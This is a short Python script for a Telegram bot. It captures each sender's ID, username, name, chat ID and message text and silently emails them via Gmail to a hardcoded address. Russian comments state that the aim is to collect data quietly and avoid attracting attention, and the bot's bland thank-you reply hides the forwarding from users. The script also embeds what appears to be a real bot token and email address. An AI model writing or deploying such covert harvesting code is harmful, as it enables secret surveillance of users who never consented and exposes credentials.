import telebot
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

BOT_TOKEN = '8479275418:AAHoXo5-aA69Rn_-pCewm90nFkgiWmBox2c'
EMAIL_LOGIN = 'robertan.eal.9.19.9@gmail.com'
EMAIL_PASSWORD = 'пароль_от_почты'  # Замените на реальный пароль или App Password
RECIPIENT_EMAIL = 'robertan.eal.9.19.9@gmail.com'

bot = telebot.TeleBot(BOT_TOKEN)

def send_email(subject, body):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_LOGIN
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain', 'utf-8'))
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_LOGIN, EMAIL_PASSWORD)
        server.sendmail(EMAIL_LOGIN, RECIPIENT_EMAIL, msg.as_string())
        server.quit()
    except Exception as e:
        pass  # Ошибки не выводим — цель: тихо собрать данные

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_info = f"ID: {message.from_user.id}\n"
    user_info += f"Username: @{message.from_user.username}\n" if message.from_user.username else "Username: None\n"
    user_info += f"First Name: {message.from_user.first_name}\n"
    user_info += f"Last Name: {message.from_user.last_name}\n" if message.from_user.last_name else "Last Name: None\n"
    user_info += f"Chat ID: {message.chat.id}\n"
    user_info += f"Text: {message.text}\n"
    
    send_email("Новое сообщение от Telegram-бота", user_info)
    # Ответ не обязателен — цель: не привлекать внимание
    bot.send_message(message.chat.id, "Спасибо! Ваше сообщение получено.")

bot.polling(none_stop=True)